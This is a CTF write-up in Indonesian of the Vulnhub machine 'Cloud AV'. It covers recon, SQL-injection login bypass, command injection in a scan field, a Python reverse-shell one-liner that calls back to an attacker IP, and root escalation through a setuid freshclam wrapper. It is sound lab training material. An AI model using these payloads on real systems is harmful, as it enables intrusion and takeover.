---
title: "BOREDHACKERBLOG: CLOUD AV - WriteUps"
date: 2023-03-10 02:00:00 +07:00
categories: [WriteUps]
tags: [ctf, Vulnhub, pentest, writeups]
image: 
---

# BOREDHACKERBLOG: CLOUD AV WriteUps

```
Cloud Anti-Virus Scanner! is a cloud-based antivirus scanning service.
Currently, it's in beta mode. You've been asked to test the setup and find vulnerabilities and escalate privs
```

## Reconnaissance

Reconnaissance, atau pengumpulan informasi, adalah langkah penting dalam aktivitas penetration testing atau ethical hacking. Tujuan dari fase ini adalah untuk mengumpulkan sebanyak mungkin informasi tentang sistem atau jaringan target, untuk mengidentifikasi kerentanan potensial dan vektor serangan. Dalam artikel ini, kita akan menjelaskan bagaimana menggunakan dua alat yang kuat, Netdiscovery dan Nmap, untuk reconnaissance.

Untuk memulai proses reconnaissance kita, pertama-tama kita akan menggunakan Netdiscovery untuk memindai jaringan dan mengidentifikasi host. Kita akan berasumsi bahwa kita memiliki akses ke jaringan lokal dan ingin mengidentifikasi semua host di jaringan.
Kita dapat menggunakan perintah berikut untuk memindai jaringan:

```bash
netdiscovery -r 192.168.100.1/24
```

Perintah ini akan memindai jaringan dengan rentang IP 192.168.100.1/24 dan menampilkan hasilnya dalam format daftar. Output akan mencakup alamat IP, alamat MAC, dan vendor dari setiap perangkat yang teridentifikasi.

![image](https://media.discordapp.net/attachments/740245586095112242/1083640614916198440/image.png)

Selanjutnya, kita akan menggunakan Nmap untuk memindai setiap host yang teridentifikasi dan mengidentifikasi port terbuka dan layanan. Kita akan berasumsi bahwa kita ingin mengidentifikasi port terbuka pada semua host di jaringan.

![image](https://media.discordapp.net/attachments/740245586095112242/1083640792985370665/image.png)

Setelah kita menginstal Nmap, kita dapat menggunakan perintah berikut untuk memindai jaringan:

![image](https://media.discordapp.net/attachments/740245586095112242/1083640951194529812/image.png)

Perintah ``nmap -sC -sV 192.168.100.126`` digunakan untuk melakukan pemindaian jaringan pada host dengan alamat IP 192.168.100.126.

Argumen ``-sC`` pada perintah tersebut mengaktifkan opsi penggunaan default dari Nmap NSE (Nmap Scripting Engine), yang menyediakan banyak skrip otomatis untuk mendeteksi kerentanan pada sistem target. Skrip-skrip tersebut akan dieksekusi oleh Nmap untuk mencari informasi tambahan pada target yang dapat digunakan untuk melakukan penilaian kerentanan.

Sementara itu, argumen ``-sV`` menginstruksikan Nmap untuk melakukan deteksi versi perangkat lunak pada semua port yang terbuka pada target. Hal ini dilakukan untuk mendapatkan informasi lebih lanjut tentang layanan yang sedang berjalan pada host dan versi perangkat lunak yang digunakan oleh layanan tersebut.

Dengan menggunakan perintah ini pada host yang spesifik, kita dapat memfokuskan upaya reconnaissance kita pada satu target dan mendapatkan informasi detail tentang versi perangkat lunak dan layanan yang sedang berjalan pada host tersebut. Informasi ini dapat digunakan untuk melakukan penilaian kerentanan dan menentukan strategi serangan yang tepat.
Selanjutnya, kita perlu memulai enumerasi terhadap mesin host, oleh karena itu kita membuka browser web untuk menjelajahi layanan HTTP Python. dan Di sini kami memiliki deskripsi Cloud Anti-Virus Scanner

![image](https://media.discordapp.net/attachments/740245586095112242/1083641359233192057/image.png)

Source code dibawah merupakan kode HTML yang digunakan untuk membuat sebuah halaman web sederhana yang menyediakan layanan beta Cloud Anti-Virus Scanner. Namun, terdapat beberapa kerentanan yang perlu diperhatikan dalam kode tersebut.

Pertama, form action pada tag ``<form>`` mengarah ke /login, yang menunjukkan bahwa data yang dimasukkan oleh pengguna akan diproses pada halaman login. Namun, tidak ada mekanisme validasi untuk memastikan bahwa data yang dimasukkan benar-benar merupakan invite code yang valid. Hal ini dapat memungkinkan serangan brute-force atau penyerangan password dengan menggunakan daftar kode yang umum digunakan atau dicoba secara acak.

Kedua, kode tersebut tidak menggunakan protokol HTTPS yang dapat menyediakan keamanan tambahan dengan mengenkripsi komunikasi antara pengguna dan server. Hal ini dapat memungkinkan serangan Man-In-The-Middle (MITM) yang dapat memungkinkan peretas untuk mencuri informasi pengguna, seperti invite code atau informasi login lainnya.

Ketiga, tidak ada mekanisme yang diberikan pada kode untuk melindungi layanan dari serangan injeksi XSS (Cross-Site Scripting) maupun SQL Injection. Hal ini dapat memungkinkan peretas untuk menyisipkan skrip berbahaya pada halaman web dan mencuri informasi pengguna yang dimasukkan.

![image](https://media.discordapp.net/attachments/740245586095112242/1083641601668169820/image.png)

## Fuzzing Dir

Dirsearch adalah sebuah alat sederhana yang digunakan untuk melakukan pencarian direktori dan file pada sebuah situs web. Perintah ``dirsearch -u http://192.168.100.126:8080/`` dapat digunakan untuk melakukan pencarian direktori dan file pada situs web dengan alamat IP 192.168.100.126 pada port 8080.

![image](https://media.discordapp.net/attachments/740245586095112242/1083641959782027314/image.png)

Dalam penggunaan dirsearch, kami menemukan beberapa direktori pada situs web yang kami telusuri, yaitu ``/console``, ``/login``, dan ``/output``. Dari ketiga direktori tersebut, terdapat satu direktori yang menarik perhatian kami, yaitu ``/console``. Namun, saat kami mencoba membuka direktori tersebut, kami mendapati bahwa akses ke dalamnya terkunci dengan menggunakan PIN. Oleh karena itu, dapat dikatakan bahwa direktori ``/console`` terkunci dan tidak dapat diakses oleh publik.

![image](https://media.discordapp.net/attachments/740245586095112242/1083642252481540217/image.png)

## Exploitation

Pada situs web yang kami telusuri, kami memfokuskan perhatian kami pada halaman utama yang dapat digunakan untuk memasukkan payload pada port 8080. Setelah melakukan beberapa penelusuran, kami memutuskan untuk menggunakan salah satu payload yang disediakan oleh [PayloadAllThings](https://github.com/swisskyrepo/PayloadsAllTheThings), yaitu payload untuk SQL Injection. Dengan menggunakan payload ini, kami dapat menguji keamanan situs web dan mencari tahu apakah situs web tersebut rentan terhadap serangan SQL Injection.

![image](https://media.discordapp.net/attachments/740245586095112242/1083642562558050316/image.png)

## SQL Injection

Dalam melakukan uji penetrasi terhadap situs web tersebut, kami menggunakan fitur Intruder yang disediakan oleh BurpSuite. Dengan menggunakan fitur ini, kami dapat melakukan brute force pada payload yang telah kami dapatkan sebelumnya dari PayloadAllThings. Tujuan dari penggunaan Intruder adalah untuk mengecek satu per satu hasil payload dari PayloadAllThings yang kami miliki dan mencari tahu apakah ada payload yang dapat berhasil melakukan serangan SQL Injection pada situs web yang kami telusuri. Dengan begitu, kami dapat mengetahui tingkat keamanan dari situs web tersebut dan menemukan celah keamanan yang dapat dimanfaatkan untuk melakukan serangan.

Untuk melakukan brute force pada parameter password, kami menggunakan fitur add pada BurpSuite. Dengan menggunakan fitur ini, kami dapat menambahkan payload yang ingin kami brute force pada parameter password tersebut. Hal ini bertujuan untuk mencoba semua kemungkinan payload yang dapat berhasil melakukan serangan SQL Injection pada situs web yang kami telusuri. Dengan begitu, kami dapat mengetahui tingkat keamanan dari situs web tersebut dan menemukan celah keamanan yang dapat dimanfaatkan untuk melakukan serangan.

![image](https://media.discordapp.net/attachments/740245586095112242/1083642772357132369/image.png)

Setelah menambahkan payload yang ingin kami brute force pada parameter password, kami memilih attack type pada BurpSuite. Kami memilih tipe attack yang disebut sniper, yang berarti BurpSuite akan mengirim satu request pada suatu waktu, mengirimkan satu payload pada setiap request tersebut. Setelah itu, kami memasukkan payload SQL Injection pada menu payload Intruder di BurpSuite. Hal ini dilakukan untuk melakukan uji penetrasi pada situs web dan mencari tahu apakah situs web tersebut rentan terhadap serangan SQL Injection.

Pada gambar yang ditunjukkan di bawah ini, terlihat bahwa terdapat perbedaan jumlah length dari hasil response brute force yang diperoleh. Hal ini menunjukkan bahwa terdapat beberapa payload yang berhasil melakukan serangan SQL Injection pada situs web yang kami telusuri, dan beberapa lainnya gagal. Oleh karena itu, kami dapat menyimpulkan bahwa situs web tersebut rentan terhadap serangan SQL Injection dan perlu dilakukan tindakan pencegahan untuk meningkatkan tingkat keamanannya.

![image](https://media.discordapp.net/attachments/740245586095112242/1083643004637675570/image.png)

Setelah melihat perbedaan jumlah length dari hasil response brute force yang diperoleh, kami memutuskan untuk menggunakan payload yang lebih spesifik untuk melakukan serangan SQL Injection pada situs web tersebut. Kami menggunakan payload berikut: ``"or 1=1 --"``. Setelah melakukan brute force dengan menggunakan payload tersebut, kami mendapatkan hasil redirect pada directory ``/scan``. Hal ini menunjukkan bahwa serangan SQL Injection berhasil dilakukan pada situs web tersebut dan kami mendapatkan akses ke direktori ``/scan``.

![image](https://media.discordapp.net/attachments/740245586095112242/1083643261043888168/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1083643355902246932/image.png)

Setelah berhasil melakukan serangan SQL Injection dan mendapatkan akses ke direktori ``/scan``, kami menemukan beberapa package yang dapat digunakan pada situs web tersebut. Beberapa package yang kami temukan antara lain ``bash, bzip, cat, eicar, hello, netcat,`` dan ``python``. Hal ini menunjukkan bahwa situs web tersebut memiliki beberapa package yang terinstall dan dapat dimanfaatkan untuk melakukan serangan.

![image](https://media.discordapp.net/attachments/740245586095112242/1083643658978467840/image.png)

Jika kita memasukkan perintah ``whoami`` pada kolom pencarian filename pada direktori ``/scan``, maka akan muncul hasil scan summary seperti yang ditunjukkan pada gambar di bawah ini. Hal ini menunjukkan bahwa situs web tersebut memiliki celah keamanan yang dapat dimanfaatkan untuk melakukan serangan dan mendapatkan informasi sensitif dari server.

![image](https://media.discordapp.net/attachments/740245586095112242/1083644108976955422/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1083644138609709076/image.png)

## RCE and Reverseshell

Apabila kita menambahkan payload seperti ``"whoami|whoami"`` pada kolom pencarian filename pada direktori ``/scan``, maka akan muncul hasil user dimana website ini dijalankan. Hal ini menunjukkan bahwa situs web tersebut memiliki celah keamanan yang dapat dimanfaatkan untuk melakukan serangan Remote Code Execution (RCE).

![image](https://media.discordapp.net/attachments/740245586095112242/1083644491031920671/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1083644631406870629/image.png)

Selanjutnya, kita mencoba untuk membaca isi file dengan menggunakan perintah ``"ls"``.

![image](https://media.discordapp.net/attachments/740245586095112242/1083644840761368666/image.png)

Dan pada hasil pencarian, kita berhasil mendapatkan daftar file dan direktori yang terdapat pada server.

![image](https://media.discordapp.net/attachments/740245586095112242/1083644988799324211/image.png)

Baik, langkah selanjutnya adalah mencoba melakukan backconnect menggunakan payload yang didapat dari [Revshell](https://www.revshells.com/) dengan bahasa Python.

Payload:

```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.100.146",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

![image](https://media.discordapp.net/attachments/740245586095112242/1083645351585665164/image.png)

## Privileges Escalation

Setelah berhasil melakukan backconnect dengan cara yang dijelaskan sebelumnya, selanjutnya kita dapat melakukan tindakan privilege escalation untuk meningkatkan hak akses dari user biasa menjadi user root.

![image](https://media.discordapp.net/attachments/740245586095112242/1083645579416055838/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1083645673884360704/image.png)

Ketika kita berada di sini, kita juga memperoleh informasi sensitif yang tersimpan di dalam database. Menemukan file database yang digunakan oleh webapp menggunakan driver sqlite3 yang memiliki beberapa kode undangan

![image](https://media.discordapp.net/attachments/740245586095112242/1083645787768098856/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1083645979598798878/image.png)

Bila kita pindah direktori dengan menggunakan perintah ``'cd ..'``, kita dapat menemukan file yang mungkin menarik seperti yang digambarkan di bawah ini.

![image](https://media.discordapp.net/attachments/740245586095112242/1083646157974163466/image.png)

Menemukan file yang memiliki izin khusus: ``update_cloudav`` dan dengan memeriksa kode sumber aplikasi, kita dapat melihat bahwa itu menjalankan ``freshclam`` untuk memperbarui database.

![image](https://media.discordapp.net/attachments/740245586095112242/1083646343614058496/image.png)

```c++
#include <stdio.h>

int main(int argc, char *argv[])
{
char *freshclam="/usr/bin/freshclam";

if (argc < 2){
printf("This tool lets you update antivirus rules\nPlease supply command line arguments for freshclam\n");
return 1;
}

char *command = malloc(strlen(freshclam) + strlen(argv[1]) + 2);
sprintf(command, "%s %s", freshclam, argv[1]);
setgid(0);
setuid(0);
system(command);
return 0;

}
```

Selanjutnya, kita mencoba menjalankan file ``./update_cloudave`` dan mendapatkan informasi seperti gambar di bawah ini.

![image](https://media.discordapp.net/attachments/740245586095112242/1083646608115245056/image.png)

Langkah selanjutnya adalah kita akan menggunakan sebuah payload tertentu untuk mencoba melakukan ``"exploit"`` pada program ``./update_cloudav``. Payload ini akan memungkinkan kita untuk memasukkan sebuah perintah yang disebut ``"/bin/bash"`` pada program tersebut. Jika payload ini berhasil dieksekusi, maka kita akan mendapatkan hak akses penuh ke sistem dan bisa melakukan berbagai tindakan di dalamnya. Untuk menguji keberhasilan payload ini, kita akan menambahkan perintah tambahan ``";/bin/bash"`` pada payload yang sebelumnya

![image](https://media.discordapp.net/attachments/740245586095112242/1083646992355438642/image.png)
